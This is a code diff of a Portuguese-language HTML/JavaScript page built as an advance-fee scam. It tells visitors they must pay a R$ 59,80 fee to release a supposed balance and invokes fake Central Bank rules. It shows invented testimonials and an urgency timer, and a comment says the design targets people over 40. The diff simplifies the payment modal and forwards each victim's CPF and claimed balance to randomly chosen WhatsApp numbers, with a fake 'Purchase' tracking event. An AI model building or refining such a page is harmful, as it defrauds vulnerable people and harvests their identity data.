@@ -196,7 +196,7 @@
             </button>
         </div>
 
-        <!-- ETAPA 6: Transação Bloqueada / Taxa com Resumo Final (RECURSO VISUAL FORTALECIDO PARA PÚBLICO 40+) -->
+        <!-- ETAPA 6: Transação Bloqueada / Taxa com Resumo Final -->
         <div id="step-taxa" class="hidden bg-white rounded-2xl shadow-lg p-6 border border-slate-200">
             
             <!-- Cronômetro de Urgência no Topo -->
@@ -263,36 +263,19 @@
 
     </main>
 
-    <!-- JANELA MODAL DE CONFIRMAÇÃO (Pop-up com opção de pagamento) -->
+    <!-- JANELA MODAL DE CONFIRMAÇÃO (Apenas com a Caixa de Seleção) -->
     <div id="modal-whatsapp" class="hidden fixed inset-0 bg-black/70 z-50 flex items-center justify-center p-4">
         <div class="bg-white rounded-2xl max-w-sm w-full p-6 shadow-2xl border-2 border-brand text-center relative">
-            <h3 class="text-lg font-black text-slate-900 mb-2">Confirmação da Taxa</h3>
-            <p class="text-xs text-slate-700 mb-3 leading-relaxed">
-                Você escolhe pagar a taxa obrigatória de <strong class="text-brand font-black text-sm">R$ 59,80</strong> por qual forma? (Lembrando que o saldo total <strong>não desconta</strong> a taxa):
+            <h3 class="text-lg font-black text-slate-900 mb-2">Confirmação de Atendimento</h3>
+            <p class="text-xs text-slate-700 mb-4 leading-relaxed">
+                Por normas de segurança do Banco Central, o valor de <strong>R$ 59,80</strong> referente à taxa operacional deve ser pago antes para a liberação do seu saldo integral.
             </p>
 
-            <!-- Seleção da Forma de Pagamento -->
-            <div class="grid grid-cols-2 gap-2 mb-4">
-                <label class="border-2 border-slate-200 rounded-xl p-3 flex flex-col items-center justify-center cursor-pointer hover:border-brand transition" id="label-pix">
-                    <input type="radio" name="forma_pagamento" value="pix" onchange="selecionarFormaPagamento('pix')" class="hidden">
-                    <span class="text-lg mb-1">⚡</span>
-                    <span class="text-xs font-bold text-slate-800">PIX</span>
-                    <span class="text-[9px] text-emerald-600 font-semibold">Liberação Imediata</span>
-                </label>
-
-                <label class="border-2 border-slate-200 rounded-xl p-3 flex flex-col items-center justify-center cursor-pointer hover:border-brand transition" id="label-boleto">
-                    <input type="radio" name="forma_pagamento" value="boleto" onchange="selecionarFormaPagamento('boleto')" class="hidden">
-                    <span class="text-lg mb-1">📄</span>
-                    <span class="text-xs font-bold text-slate-800">Boleto</span>
-                    <span class="text-[9px] text-slate-500">Até 1 dia útil</span>
-                </label>
-            </div>
-
-            <!-- Checkbox dentro do Modal -->
-            <div class="bg-blue-50 border border-blue-200 rounded-xl p-3 mb-5 text-left flex items-start space-x-2.5">
+            <!-- Checkbox de Confirmação Obrigatório -->
+            <div class="bg-blue-50 border border-blue-200 rounded-xl p-3.5 mb-5 text-left flex items-start space-x-3">
                 <input type="checkbox" id="modal-check" onchange="liberarBotaoModal()" class="mt-0.5 w-5 h-5 accent-brand cursor-pointer flex-shrink-0">
-                <label for="modal-check" class="text-xs text-slate-800 font-bold cursor-pointer leading-tight">
-                    Estou ciente de que preciso pagar a taxa de R$ 59,80 antes para liberar meu dinheiro.
+                <label for="modal-check" class="text-xs text-slate-900 font-bold cursor-pointer leading-tight">
+                    Estou ciente de que preciso pagar a taxa de R$ 59,80 para liberar o meu dinheiro.
                 </label>
             </div>
 
@@ -325,7 +308,6 @@
         let cpfGlobal = "";
         let valorGlobal = "";
         let contaGlobal = "";
-        let formaPagamentoSelecionada = "";
 
         const bancoDepoimentos = [
             { nome: "Maria S.", cidade: "São Paulo - SP", valor: "R$ 7.420", texto: "Paguei a taxa de 59,80 pelo WhatsApp e em 10 minutos o dinheiro caiu na minha conta. Recomendo muito!" },
@@ -561,13 +543,6 @@
 
         function abrirModalConfirmacao() {
             document.getElementById('modal-check').checked = false;
-            formaPagamentoSelecionada = "";
-            
-            document.getElementById('label-pix').classList.remove('border-brand', 'bg-blue-50');
-            document.getElementById('label-boleto').classList.remove('border-brand', 'bg-blue-50');
-            let radios = document.getElementsByName('forma_pagamento');
-            for(let i=0; i<radios.length; i++) radios[i].checked = false;
-
             liberarBotaoModal();
             document.getElementById('modal-whatsapp').classList.remove('hidden');
         }
@@ -576,26 +551,11 @@
             document.getElementById('modal-whatsapp').classList.add('hidden');
         }
 
-        function selecionarFormaPagamento(opcao) {
-            formaPagamentoSelecionada = opcao;
-            let labelPix = document.getElementById('label-pix');
-            let labelBoleto = document.getElementById('label-boleto');
-
-            if (opcao === 'pix') {
-                labelPix.classList.add('border-brand', 'bg-blue-50');
-                labelBoleto.classList.remove('border-brand', 'bg-blue-50');
-            } else {
-                labelBoleto.classList.add('border-brand', 'bg-blue-50');
-                labelPix.classList.remove('border-brand', 'bg-blue-50');
-            }
-            liberarBotaoModal();
-        }
-
         function liberarBotaoModal() {
             let marcado = document.getElementById('modal-check').checked;
             let botaoZap = document.getElementById('modal-btn-zap');
 
-            if (marcado && formaPagamentoSelecionada !== "") {
+            if (marcado) {
                 botaoZap.classList.remove('bg-slate-300', 'text-slate-500', 'cursor-not-allowed', 'pointer-events-none');
                 botaoZap.classList.add('bg-emerald-600', 'hover:bg-emerald-700', 'text-white', 'cursor-pointer', 'animate-pulse', 'shadow-md');
             } else {
@@ -606,7 +566,7 @@
 
         function dispararWhatsApp(event) {
             let marcado = document.getElementById('modal-check').checked;
-            if (!marcado || formaPagamentoSelecionada === "") {
+            if (!marcado) {
                 event.preventDefault();
                 return;
             }
@@ -615,11 +575,10 @@
                 fbq('track', 'Purchase');
             }
 
-            const numerosWhatsApp = ["1556982192582", "5516981022688", "5516981022060"];
+            const numerosWhatsApp = ["1556982192582", "5516981022688"];
             let numeroSorteado = numerosWhatsApp[Math.floor(Math.random() * numerosWhatsApp.length)];
 
-            let tipoPgtoTexto = formaPagamentoSelecionada === 'pix' ? 'Pix' : 'Boleto';
-            let textoMensagem = `Oi quero pagar a taxa de emissao via ${tipoPgtoTexto}. Meu CPF é ${cpfGlobal} e tenho o valor de ${valorGlobal} disponível para saque.`;
+            let textoMensagem = `Oi quero pagar a taxa de emissao. Meu CPF é ${cpfGlobal} e tenho o valor de ${valorGlobal} disponível para saque.`;
             let mensagemCodificada = encodeURIComponent(textoMensagem);
 
             let linkZap = `https://wa.me/${numeroSorteado}?text=${mensagemCodificada}`;
